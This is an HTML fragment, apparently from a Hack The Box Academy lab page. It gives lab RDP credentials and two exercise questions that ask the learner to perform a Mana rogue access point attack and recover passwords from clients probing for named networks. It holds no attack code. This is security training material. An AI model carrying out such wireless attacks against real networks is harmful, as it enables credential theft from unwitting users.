<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2835 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2835"><span class="badge badge-soft-dark font-size-14 mr-2">+ 5 <i class="fad fa-cube text-success"></i></span> Perform the Mana attack as demonstrated in this section. What is the password obtained from the client probing for the network named StarLight-Hospital?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2835" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2835">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2835" id="btnAnswer2835">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2836 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2836"><span class="badge badge-soft-dark font-size-14 mr-2">+ 5 <i class="fad fa-cube text-success"></i></span> Perform the Mana attack as demonstrated in this section. What is the password obtained from the client probing for the network named  HackTheBox?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2836" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2836">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2836" id="btnAnswer2836">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
